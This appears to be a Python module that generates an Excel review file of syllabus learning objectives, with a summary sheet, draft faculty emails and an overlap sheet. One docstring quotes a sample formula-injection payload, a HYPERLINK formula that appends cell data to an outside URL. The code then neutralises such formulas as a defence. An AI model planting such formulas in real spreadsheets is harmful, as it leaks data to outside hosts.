"""Builds the coordinator's Excel review file from an audit. Nothing is stored:
the file is generated on request and handed to the browser."""
from __future__ import annotations

import io
from datetime import datetime

from openpyxl import Workbook
from openpyxl.formatting.rule import FormulaRule
from openpyxl.styles import Alignment, Font, PatternFill
from openpyxl.worksheet.datavalidation import DataValidation

from .overlap import find_overlaps

STATUSES = ["Pending", "Approved", "Needs changes"]
MAROON = "500000"
RED_BG, RED_FG = "FDE4E4", "C62828"
GREEN_BG, GREEN_FG = "E4F4E9", "1E6B3A"
AMBER_BG, AMBER_FG = "FFF3D4", "986300"
BLUE_BG = "EAF1FB"
WRAP = Alignment(wrap_text=True, vertical="top")
EXAMPLE_VERBS = "Explain, Analyze, Design or Evaluate"


def problem_text(o: dict) -> str:
    parts = [f'"{t}" isn\'t on the approved list' for t in o.get("avoid_terms", [])]
    parts += [r for r in o.get("reasons", []) if r]
    if not parts and o.get("status") == "not_listed":
        parts.append("starts with a verb that isn't on the approved list")
    if not parts and o.get("status") not in (None, "ok"):
        parts.append("it's vague or hard to measure")
    return "; ".join(dict.fromkeys(parts))


def _safe_suggestion(s: str | None) -> str | None:
    """Only ever pass along rewrites that start with an approved verb and use no avoid words."""
    if not s:
        return None
    from .llm import suggestion_ok
    return s if suggestion_ok(s) else None


def _words(n: int) -> str:
    return ["Zero", "One", "Two", "Three", "Four", "Five", "Six", "Seven", "Eight", "Nine", "Ten"][n] if n <= 10 else str(n)


def faculty_note(r: dict) -> str:
    """A short, polite email the coordinator can copy. Empty if there's nothing to say."""
    course = r["course"]
    objs = r.get("objectives", [])
    if r.get("status") == "unreadable":
        return ""          # our problem (couldn't open it), not something to email the professor about
    if not objs:
        return (f"Hi,\n\nWe couldn't find learning objectives in the {course} syllabus"
                f"{' (' + r['file']['name'] + ')' if r.get('file', {}).get('name') else ''}. "
                f"Could you add them in Simple Syllabus? Please start each one with a verb from the "
                f"approved Bloom's list, for example {EXAMPLE_VERBS}.\n\nThanks!")
    bad = [(i, o) for i, o in enumerate(objs, 1) if o.get("status") != "ok"]
    dup = [(i, o) for i, o in enumerate(objs, 1) if o.get("overlaps")]
    if not bad and not dup:
        return ""
    lines = ["Hi,", ""]
    if bad:
        n = len(bad)
        lines.append(f"Thanks for the learning objectives for {course}. "
                     f"{'One needs' if n == 1 else f'{_words(n)} need'} a small update to match the department's "
                     f"approved Bloom's verb list:")
        lines.append("")
        for i, o in bad:
            lines.append(f'Objective {i}: "{o["text"]}"')
            lines.append(f"Issue: {problem_text(o)}.")
            sug = _safe_suggestion(o.get("suggestion"))
            lines.append(f'Suggested: "{sug}"' if sug else
                         f"Suggested: start it with an approved verb such as {EXAMPLE_VERBS}.")
            lines.append("")
    else:
        lines.append(f"Thanks for the learning objectives for {course}. The verbs all look good.")
        lines.append("")
    if dup:
        lines.append("Also, a quick curriculum check:" if bad else "One quick curriculum check:")
        for i, o in dup:
            lines.append(f"Objective {i} is {o['overlaps'][0].split('(')[-1].rstrip(')')} to "
                         f"{o['overlaps'][0].split(' (')[0]}"
                         f"{' and others' if len(o['overlaps']) > 1 else ''}. Is that intended?")
        lines.append("")
    if bad:
        lines.append("Could you update these in Simple Syllabus when you get a chance? "
                     "Happy to help if anything is unclear.")
        lines.append("")
    lines.append("Thanks!")
    return "\n".join(lines)


def _header(ws, headers, widths):
    ws.append(headers)
    for i, w in enumerate(widths, 1):
        ws.column_dimensions[ws.cell(1, i).column_letter].width = w
    for c in ws[1]:
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor=MAROON)
        c.alignment = Alignment(vertical="center", wrap_text=True)
    ws.row_dimensions[1].height = 22
    ws.freeze_panes = "A2"


def _web(ws, row, col, url):
    """The course name opens the syllabus on the website (Simple Syllabus runs only; https only)."""
    if isinstance(url, str) and url.startswith("https://"):
        ws.cell(row, col).hyperlink = url
        ws.cell(row, col).font = Font(color="1155CC", underline="single")


def _link(ws, row, col, f):
    target = f.get("excel_link") or f.get("link")
    if target:
        ws.cell(row, col).hyperlink = target
        ws.cell(row, col).font = Font(color="1155CC", underline="single")


def _landscape(ws):
    ws.page_setup.orientation = "landscape"
    ws.page_setup.fitToWidth, ws.page_setup.fitToHeight = 1, 0
    ws.sheet_properties.pageSetUpPr.fitToPage = True
    ws.print_title_rows = "1:1"


def _no_formulas(wb):
    """Syllabus text comes from professors. A cell like '=HYPERLINK("http://x?"&A1)' must show as
    text, never run as a formula in the reviewer's Excel."""
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                if c.data_type == "f":
                    c.data_type = "s"


def build_review_xlsx(audit: dict) -> bytes:
    results = audit.get("results", [])
    overlaps = audit.get("overlaps")
    if overlaps is None:
        overlaps = find_overlaps(results)

    wb = Workbook()

    # ---------------- Review: one row per objective ----------------
    ws = wb.active
    ws.title = "Review"
    _header(ws, ["Course", "File", "#", "Learning objective", "Problem found", "Suggested rewrite",
                 "Also in other courses", "Bloom level", "Status", "Reviewer comment"],
            [12, 24, 4, 58, 36, 58, 26, 14, 16, 36])
    order = {"avoid": 0, "vague": 1, "no_objectives": 2, "unreadable": 3, "clean": 4}
    results = sorted(results, key=lambda r: (order.get(r["status"], 5), r["course"]))
    for r in results:
        f = r.get("file", {})
        if not r.get("objectives"):
            ws.append([r["course"], f.get("name", ""), "", "", r.get("summary") or "No learning objectives found",
                       "", "", "", "Pending", ""])
            row = ws.max_row
            for c in ws[row]:
                c.alignment = WRAP
            ws.cell(row, 5).fill = PatternFill("solid", fgColor=AMBER_BG)
            _link(ws, row, 2, f)
            _web(ws, row, 1, r.get("url"))
            continue
        for i, o in enumerate(r["objectives"], 1):
            bad = o.get("status") != "ok"
            sug = _safe_suggestion(o.get("suggestion")) if bad else None
            ws.append([r["course"], f.get("name", ""), i, o["text"],
                       (problem_text(o)[:1].upper() + problem_text(o)[1:]) if bad else "Looks good",
                       sug or "", "\n".join(o.get("overlaps", [])), o.get("bloom_level") or "", "Pending", ""])
            row = ws.max_row
            for c in ws[row]:
                c.alignment = WRAP
            if bad:
                ws.cell(row, 5).font = Font(color=RED_FG)
                ws.cell(row, 5).fill = PatternFill("solid", fgColor=RED_BG)
                if sug:
                    ws.cell(row, 6).fill = PatternFill("solid", fgColor=GREEN_BG)
            else:
                ws.cell(row, 5).font = Font(color=GREEN_FG)
            if o.get("overlaps"):
                ws.cell(row, 7).fill = PatternFill("solid", fgColor=BLUE_BG)
            _link(ws, row, 2, f)
            _web(ws, row, 1, r.get("url"))

    last = max(ws.max_row, 2) + 500
    dv = DataValidation(type="list", formula1='"' + ",".join(STATUSES) + '"', allow_blank=True,
                        errorTitle="Status", error="Pick Pending, Approved or Needs changes")
    ws.add_data_validation(dv)
    dv.add(f"I2:I{last}")
    ws.conditional_formatting.add(f"I2:I{last}", FormulaRule(formula=['$I2="Approved"'],
                                  fill=PatternFill("solid", fgColor=GREEN_BG), font=Font(color=GREEN_FG, bold=True)))
    ws.conditional_formatting.add(f"I2:I{last}", FormulaRule(formula=['$I2="Needs changes"'],
                                  fill=PatternFill("solid", fgColor=RED_BG), font=Font(color=RED_FG, bold=True)))
    ws.auto_filter.ref = f"A1:J{ws.max_row}"
    _landscape(ws)

    # ---------------- Summary: one row per course + email note ----------------
    sm = wb.create_sheet("Summary")
    _header(sm, ["Course", "File", "Objectives", "Need changes", "Overlap other courses", "Result",
                 "Note to faculty (copy into an email)"], [12, 26, 11, 13, 14, 34, 80])
    for r in results:
        objs = r.get("objectives", [])
        bad = sum(1 for o in objs if o.get("status") != "ok")
        dup = sum(1 for o in objs if o.get("overlaps"))
        note = faculty_note(r)
        sm.append([r["course"], r.get("file", {}).get("name", ""), len(objs), bad, dup, r.get("summary", ""), note])
        row = sm.max_row
        for c in sm[row]:
            c.alignment = WRAP
        if bad:
            sm.cell(row, 4).font = Font(color=RED_FG, bold=True)
        if dup:
            sm.cell(row, 5).font = Font(color="1155CC", bold=True)
        if not objs:
            sm.cell(row, 6).font = Font(color=AMBER_FG, bold=True)
        if note:
            sm.row_dimensions[row].height = min(400, 15 * (note.count("\n") + 2 + len(note) // 95))
        _link(sm, row, 2, r.get("file", {}))
        _web(sm, row, 1, r.get("url"))
    sm.append([])
    sm.append([f"Folder: {audit.get('folder_name', '')}", "", "", "", "",
               f"Generated {datetime.now().strftime('%b %d, %Y %I:%M %p')}"])
    sm.auto_filter.ref = f"A1:G{len(results) + 1}"
    _landscape(sm)

    # ---------------- Overlaps: pairs of near-identical objectives ----------------
    ov = wb.create_sheet("Overlaps")
    _header(ov, ["Course", "#", "Learning objective", "Overlaps with", "#", "Learning objective", "Match"],
            [12, 4, 58, 13, 4, 58, 16])
    if not overlaps:
        ov.append(["No overlapping objectives found across courses."])
    for p in overlaps:
        ov.append([p["a_course"], p["a_idx"], p["a_text"], p["b_course"], p["b_idx"], p["b_text"],
                   f"{p['kind'].capitalize()} ({p['score']}%)"])
        for c in ov[ov.max_row]:
            c.alignment = WRAP
        ov.cell(ov.max_row, 7).font = Font(color="1155CC" if p["kind"] != "identical" else RED_FG, bold=True)
    _landscape(ov)

    _no_formulas(wb)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()
